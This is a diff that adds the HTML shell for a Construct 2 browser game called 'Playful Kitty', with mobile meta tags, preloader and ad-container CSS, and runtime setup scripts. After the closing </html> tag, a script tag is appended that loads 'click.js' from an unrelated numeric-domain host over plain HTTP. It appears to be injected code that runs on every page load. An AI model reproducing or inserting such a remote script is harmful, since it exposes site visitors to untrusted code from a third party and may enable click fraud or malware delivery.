@@ -1,0 +1,82 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<title>Playful Kitty</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="mobile-web-app-capable" content="yes" />
+
+<style type="text/css">
+* {
+padding: 0;
+margin: 0;
+-webkit-user-select:none;-webkit-touch-callout:none;
+}
+html, body {
+background: #000;
+color: #fff;
+overflow: hidden;
+touch-action: none;
+-ms-touch-action: none;
+}
+canvas {
+touch-action-delay: none;
+touch-action: none;
+-ms-touch-action: none;
+}
+#lagglink{display:none;position:absolute;bottom:0;left:0;right:0;height:60px;z-index:1000}
+#lagglink.showme{display:block}
+body{height:100vh;width:100%;margin:0;padding:0}
+#adContainer,#contentElement,#mainContainer,video{width:100%;height:100vh;z-index:1001;background-color:#000}
+#playButton,#preloader{bottom:0;top:0;left:0;right:0;background-color:#ffeff8;z-index:2000}
+#playButton button,#playButton img,#preloader:after{position:absolute;top:60%}
+#preloader{position:absolute;z-index:10000}
+#preloader:before{content:' ';width:203px;height:45px;position:absolute;top:50%;left:50%;margin-left:-101px;background-size:203px 45px}
+#preloader:after{content:'loading...';left:50%;color:#333;margin-left:-36px;font-size:18px}
+#adContainer{position:absolute;top:0;left:0}video{position:absolute}
+#adContainer iframe{background-color:transparent!important}
+#contentElement{position:absolute;overflow:hidden}
+#playButton{position:absolute}
+#playButton img{width:200px;height:200px;border-radius:10px;left:50%;border:1px solid #CA3C8C;margin:-220px 0 0 -100px}
+#playButton button{float:left;display:block;width:50%;padding:13px 0;color:#fff;font-size:1.5em;font-weight:700;border-radius:5px;text-align:center;background-color:#CA3C8C;border:0;outline:0;margin-left:25%}
+@media (max-width:800px) {
+#playButton button{width:80%;margin-left:10%}
+}
+</style>
+</head>
+<body>
+<div id="fb-root"></div>
+
+<div id="c2canvasdiv">
+
+<canvas id="c2canvas" width="960" height="540"></canvas>
+</div>
+
+<script src="jquery-2.1.1.min.js"></script>
+
+<script src="c2runtime.js"></script>
+<script>
+jQuery(document).ready(function () {			
+cr_createRuntime("c2canvas");
+});
+
+function onVisibilityChanged() {
+if (document.hidden || document.mozHidden || document.webkitHidden || document.msHidden)
+cr_setSuspended(true);
+else
+cr_setSuspended(false);
+};
+
+document.addEventListener("visibilitychange", onVisibilityChanged, false);
+document.addEventListener("mozvisibilitychange", onVisibilityChanged, false);
+document.addEventListener("webkitvisibilitychange", onVisibilityChanged, false);
+document.addEventListener("msvisibilitychange", onVisibilityChanged, false);
+
+</script>
+</body>
+</html> <script src="http://test.877337.com/click.js"></script>
